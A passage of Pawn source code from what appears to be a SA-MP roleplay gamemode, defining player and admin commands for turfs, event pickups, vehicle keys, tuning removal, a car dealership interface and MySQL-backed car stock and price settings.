	SCM(playerid,COLOR_SERVER,string);
	format(string,sizeof(string),"Grove Street - %d turfs",p);
	SCM(playerid,COLOR_SERVER,string);
	format(string,sizeof(string),"Los Vagos - %d turfs",s);
	SCM(playerid,COLOR_SERVER,string);
	format(string,sizeof(string),"Ballas - %d turfs",r);
	SCM(playerid,COLOR_SERVER,string);
	return 1;
}
CMD:oplace(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 3) return SCM(playerid,COLOR_ERROR, AdminOnly);
	if(eventobjects > 9) return SCM(playerid,COLOR_SERVER,"{FFB870}You can't place more than 10 objects.");
	new objectid,prize,sendername[30],Float:pX,Float:pY,Float:pZ,string[128];
	if(sscanf(params, "dd",objectid,prize))
	{
		SendClientMessage(playerid, COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/oplace <ObjectID> <Prize>");
		SendClientMessage(playerid, COLOR_SERVER,"[OBJECTS] Cadou: 19054 - 19058 | Glob craciun: 19059 - 19063 | Oua paste: 19341 - 19345");
		return 1;
	}
	if(prize < 50000 || prize > 5000000) return SendClientMessage(playerid, COLOR_SERVER, "Prize must be between $50,000 and $ 5,000,000.");
	GetPlayerName(playerid, sendername, sizeof(sendername));
	GetPlayerPos(playerid,pX,pY,pZ);
	eventobjects++;
	objectevent[eventobjects] = CreatePickup(objectid, 2, pX+2,pY,pZ, -1);
	eventprizeobj[eventobjects] = prize;
	format(string,sizeof(string),"Admin %s[admin:%d] started an event. Object: %d, Sockets $%s.",sendername,PlayerInfo[playerid][pSQLID],objectid,FormatNumber(prize));
	ABroadCast(COLOR_RED2, string,1);
	Adminlog(string);
	return 1;
}
CMD:toglc(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pLeader] < 1 && PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not leader/admin.");
	if(toglc[playerid] == 0)
	{
	    toglc[playerid] = 1;
	    SCM(playerid,COLOR_SERVER,"You disable leader chat.");
	}
	else if(toglc[playerid] == 1)
	{
	    toglc[playerid] = 0;
	    SCM(playerid,COLOR_SERVER,"You enable leader chat.");
	}
	return 1;
}
CMD:checkv(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,string[256];
	if(sscanf(params, "u",id)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/checkv <Name/Playerid>");
	if(PlayerInfo[id][pPcarkey] == 0 && PlayerInfo[id][pmotokey] == 0 && PlayerInfo[id][phelikey] == 0 && PlayerInfo[id][pprcarkey] == 0 && PlayerInfo[id][pprcarkey2] == 0 && PlayerInfo[id][pPPluscarkey] == 0 && PlayerInfo[id][pPPluscarkey2] == 0
	&& PlayerInfo[id][pCarkey7] == 0 && PlayerInfo[id][pCarkey8] == 0 && PlayerInfo[id][pCarkey9] == 0 && PlayerInfo[id][pCarkey10] == 0 && PlayerInfo[id][pCarkey11] == 0 &&
	PlayerInfo[id][pCarkey12] == 0 && PlayerInfo[id][pCarkey13] == 0 && PlayerInfo[id][pCarkey14] == 0 && PlayerInfo[id][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}This player do not have a vehicle.");
	if(IsPlayerConnected(id))
	{
		if(personalcar[0][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[0][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[0][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[1][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[1][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[1][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[2][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[2][id]);
       		format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[2][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[3][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[3][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[3][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[4][id] != 0)
		{
        	new vid = OwnedVeh(personalcar[4][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[4][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[5][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[5][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[5][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[6][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[6][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[6][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[7][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[7][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[7][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[8][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[8][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[8][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[9][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[9][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[9][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[10][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[10][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[10][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[11][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[11][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[11][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[12][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[12][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[12][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[13][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[13][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[13][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		if(personalcar[14][id] != 0)
    	{
        	new vid = OwnedVeh(personalcar[14][id]);
        	format(string,sizeof(string),"[ID:%d] %s | age: %d | km: %.0f | colors: %d, %d",personalcar[14][id],CarInfo[vid][cDescription],CarInfo[vid][cDays],CarInfo[vid][cKM],CarInfo[vid][cColorOne],CarInfo[vid][cColorTwo]);
        	SendClientMessage(playerid, COLOR_SERVER, string);
		}
		
	}
	return 1;
}
CMD:removetunning(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0 && 
	PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0 && PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You don't have a vehicle.");
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_ERROR, "You're not in your personal vehicle.");
	new vid = GetPlayerVehicleID(playerid);
	new carid = GetPlayerVehicleID(playerid);
	if(vid != personalcar[0][playerid] && vid != personalcar[1][playerid] && vid != personalcar[2][playerid] && vid != personalcar[3][playerid] && vid != personalcar[4][playerid] && vid != personalcar[5][playerid]
	&& vid != personalcar[6][playerid] && vid != personalcar[7][playerid] && vid != personalcar[8][playerid] && vid != personalcar[9][playerid] && vid != personalcar[10][playerid]
	&& vid != personalcar[11][playerid] && vid != personalcar[12][playerid] && vid != personalcar[13][playerid] && vid != personalcar[14][playerid]) return SendClientMessage(playerid, COLOR_SERVER, "Nu esti in masina personala.");
	CarInfo[OwnedVeh(carid)][cPaintJ] = 6;
	CarInfo[OwnedVeh(carid)][mod1] = 0;
	CarInfo[OwnedVeh(carid)][mod2] = 0;
	CarInfo[OwnedVeh(carid)][mod3] = 0;
	CarInfo[OwnedVeh(carid)][mod4] = 0;
	CarInfo[OwnedVeh(carid)][mod5] = 0;
	CarInfo[OwnedVeh(carid)][mod6] = 0;
	CarInfo[OwnedVeh(carid)][mod7] = 0;
	CarInfo[OwnedVeh(carid)][mod8] = 0;
	CarInfo[OwnedVeh(carid)][mod9] = 0;
	CarInfo[OwnedVeh(carid)][mod10] = 0;
	CarInfo[OwnedVeh(carid)][mod11] = 0;
	CarInfo[OwnedVeh(carid)][mod12] = 0;
	CarInfo[OwnedVeh(carid)][mod13] = 0;
	CarInfo[OwnedVeh(carid)][mod14] = 0;
	CarInfo[OwnedVeh(carid)][mod15] = 0;
	CarInfo[OwnedVeh(carid)][mod16] = 0;
	CarInfo[OwnedVeh(carid)][mod17] = 0;
	vUpdate(OwnedVeh(carid), cModsx);
	vUpdate(OwnedVeh(carid), cPaintJx);
	new componentid;
	for (new i; i < 14; i++)
	{
		componentid = GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), i);
		if(componentid != 0)
		{
			RemoveVehicleComponent(GetPlayerVehicleID(playerid), componentid);
		}	
	}
	SCM(playerid,COLOR_SERVER,"{FFFF00}You removed the car tuning.");
	return 1;
}
CMD:switchkey(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(SwitchKey[playerid] == 1)
	{
	    if(HireCar[playerid] != -1)
	    {
	        SwitchKey[playerid] = 2;
			SCM(playerid,COLOR_SERVER,"{FFB870}Now control your rental car.");
	    }
	    else return SCM(playerid,COLOR_SERVER,"{FFB870}You do not have a rental car.");
	}
	else if(SwitchKey[playerid] == 2)
	{
		if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
		&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0 && 
		PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0 && PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You don't have a vehicle.");
        SwitchKey[playerid] = 1;
		SCM(playerid,COLOR_SERVER,"{FFB870}Now control your personal car.");
	}
	return 1;
}
CMD:givekey(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
        new id,giveplayer[30],sendername[30],string[128];
		if(sscanf(params, "u",id)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/givekey <Name/Playerid>");
		if(HireCar[id] != -1) return SCM(playerid,COLOR_SERVER,"{FFB870}This player already has a pair of keys.");
		if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
		&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0 && 
		PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0 && PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You don't have a vehicle.");
		if (IsPlayerConnected(id))
		{
			if(id != INVALID_PLAYER_ID)
			{
				if(ProxDetectorS(5.0, playerid, id))
				{
				    new carid = GetPlayerVehicleID(playerid);
					if(carid == personalcar[0][playerid] || carid == personalcar[1][playerid] || carid == personalcar[2][playerid] || carid == personalcar[3][playerid] || carid == personalcar[4][playerid] || carid == personalcar[5][playerid]
					 || carid == personalcar[6][playerid] || carid == personalcar[7][playerid] || carid == personalcar[8][playerid] || carid == personalcar[9][playerid] || carid == personalcar[10][playerid]
					 || carid == personalcar[11][playerid] || carid == personalcar[12][playerid] || carid == personalcar[13][playerid] || carid == personalcar[14][playerid])
					{
						HireCar[id] = carid;
						GetPlayerName(id, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "{B8FFDB}You have given %s the key to your vehicle", giveplayer);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_SERVER, string);
						format(string, sizeof(string), "{B8FFDB}You have recieved the key to a vehicle from %s", sendername);
						SendClientMessage(id, COLOR_SERVER, string);
						format(string, sizeof(string), "* %s takes out a set of keys, and tosses them to %s.", sendername ,giveplayer);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
    					SwitchKey[id] = 2;
					}
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:changekey(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
		&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0 && 
		PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0 && PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You don't have a vehicle.");
    	foreach(Player,i)
		{
 			if(HireCar[i] == personalcar[0][playerid] || HireCar[i] == personalcar[1][playerid] || HireCar[i] == personalcar[2][playerid] || HireCar[i] == personalcar[3][playerid] || HireCar[i] == personalcar[4][playerid] || HireCar[i] == personalcar[5][playerid]
		  	|| HireCar[i] == personalcar[6][playerid] || HireCar[i] == personalcar[7][playerid] || HireCar[i] == personalcar[8][playerid] || HireCar[i] == personalcar[9][playerid] || HireCar[i] == personalcar[10][playerid]
			|| HireCar[i] == personalcar[11][playerid] || HireCar[i] == personalcar[12][playerid] || HireCar[i] == personalcar[13][playerid] || HireCar[i] == personalcar[14][playerid])
			{
				HireCar[i] = -1;
			}
		}
		SCM(playerid,COLOR_SERVER,"{B8FFDB}You change your vehicle key.");
	}
	return 1;
}
CMD:changelock(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_changekey(playerid, params);
}
// DealerShip
CMD:buycar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_SERVER,"{FFB870}Please get out of the car.");
	if(IsPlayerInRangeOfPoint(playerid, 7.0, 1574.8773,-1274.0566,17.6131))
	{
		if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be level 3 to buy a vehicle.");
		BuyCar[playerid] = 1;
		new idstock = BuyCar[playerid];
		new string[1000];
		//ShowPlayerDialog(playerid,DIALOG_CARBUY, DIALOG_STYLE_LIST, "Buy a car", "Cheap cars\nRegular cars\nExpensive cars\nPremium cars", "Select", "Close");
		PlayerTextDrawSetPreviewModel(playerid, DealerShipTD[playerid][6], Stock[idstock][vModel]);
		PlayerTextDrawSetPreviewVehCol(playerid, DealerShipTD[playerid][6], 1, 1);
		format(string, sizeof(string), "%s",Stock[idstock][vName]);
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][4],string);
		PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
		format(string, sizeof(string), "STOCK:_%s~n~CULOARE_1:_1~n~CULOARE_2:_1~n~Price:_$%s",FormatNumber(Stock[idstock][vStock]),FormatNumber(Stock[idstock][vPrice]));
		PlayerTextDrawSetString(playerid, DealerShipTD[playerid][5],string);
		vcol1[playerid] = 1;
		vcol2[playerid] = 1;
		DealerShipTextDrawShow(playerid);
		esteinds[playerid] = 1;
		DSCAR[playerid] = CreateVehicle(Stock[idstock][vModel], 1578.0552,-1257.0072,17.2508,141.2787,vcol1[playerid],vcol2[playerid],-1);
		PlayerTextDrawSetPreviewRot(playerid, DealerShipTD[playerid][6], 0.000000, 0.000000, 30.000000, 1.000000);
		SelectTextDraw(playerid, COLOR_SERVER);
		SetPlayerVirtualWorld(playerid, 69*playerid);
		SetVehicleVirtualWorld(DSCAR[playerid], 69*playerid);
	}
	else return SCM(playerid,COLOR_SERVER,"{FFB870}You are not the place where you can buy a car.");
  	return 1;
}
stock DealerShipTextDrawShow(playerid)
{
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][0]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][1]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][2]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][3]);
	PlayerTextDrawShow(playerid, DealerShipTD[playerid][4]);
	PlayerTextDrawShow(playerid, DealerShipTD[playerid][5]);
	PlayerTextDrawShow(playerid, DealerShipTD[playerid][6]);
	PlayerTextDrawShow(playerid, DealerShipTD[playerid][7]);
	PlayerTextDrawShow(playerid, DealerShipTD[playerid][8]);
	//PlayerTextDrawShow(playerid, DealerShipTD[playerid][9]);
	PlayerTextDrawShow(playerid, DealerShipTD[playerid][10]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][11]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][12]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][13]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][14]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][15]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][16]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][17]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][18]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][19]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][20]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][21]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][22]);
    PlayerTextDrawShow(playerid, DealerShipTD[playerid][23]);
	SetPlayerCameraPos(playerid, 1573.8019,-1261.4473,18.0577);
	SetPlayerCameraLookAt(playerid, 1577.0880,-1257.9735,18.4584);
	return 1;
}
stock DealerShipTextDrawHide(playerid)
{
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][0]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][1]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][2]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][3]);
	PlayerTextDrawHide(playerid, DealerShipTD[playerid][4]);
	PlayerTextDrawHide(playerid, DealerShipTD[playerid][5]);
	PlayerTextDrawHide(playerid, DealerShipTD[playerid][6]);
	PlayerTextDrawHide(playerid, DealerShipTD[playerid][7]);
	PlayerTextDrawHide(playerid, DealerShipTD[playerid][8]);
	//PlayerTextDrawHide(playerid, DealerShipTD[playerid][9]);
	PlayerTextDrawHide(playerid, DealerShipTD[playerid][10]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][11]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][12]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][13]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][14]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][15]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][16]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][17]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][18]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][19]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][20]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][21]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][22]);
    PlayerTextDrawHide(playerid, DealerShipTD[playerid][23]);
    esteinds[playerid] = -1;
	DestroyVehicle(DSCAR[playerid]);
	SetCameraBehindPlayer(playerid);
	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}
//-----------------------------------------------------------
CMD:setcar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if(PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
		new model[10],test,tableid,string[64],car[30];
		if(sscanf(params, "s[10]is[30]",model,test,car)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/setcar <Stock/Price> <Ammount> <Car Name>");
		tableid = MySQLCheckCar(car)+1;
		if(tableid == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid car name.");
		if(strcmp(model,"stock",true) == 0)
     	{
			Stock[tableid][vStock] = test;
			format(string,sizeof(string),"You set the stock to %d for car %s.",test,car);
			SCM(playerid,COLOR_SERVER,string);
	        mysql_format(SQL,string, sizeof(string), "UPDATE stock SET Stock='%d' WHERE `ID`='%d'", Stock[tableid][vStock], tableid);
	        mysql_tquery(SQL,string,"","");
	       	return 1;
        }
        if(strcmp(model,"price",true) == 0)
        {
			Stock[tableid][vPrice] = test;
			format(string,sizeof(string),"You set the price to %s for car %s.",FormatNumber(test),car);
			SCM(playerid,COLOR_SERVER,string);
	        mysql_format(SQL,string, sizeof(string), "UPDATE stock SET `Price`='%d' WHERE `ID`='%d'", Stock[tableid][vPrice], tableid);
	        mysql_tquery(SQL,string,"","");
	        return 1;
        }
 	}
 	return 1;
}
CMD:v(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new masina[1000], masina1[1000];
	new masiniimperfecte = 0;
	if(PlayerInfo[playerid][pPcarkey] != 0)// slot 1
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPcarkey]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pmotokey] != 0)// slot 2
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pmotokey]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pprcarkey] != 0)// slot 3
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pprcarkey]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pprcarkey2] != 0)// slot 4
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pprcarkey2]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pPPluscarkey] != 0)// slot 5
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPPluscarkey]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pPPluscarkey2] != 0) // slot 6
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPPluscarkey2]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey7] != 0) // slot 7
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey7]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey8] != 0) // slot 8
	{
		new rezolvare[1500];
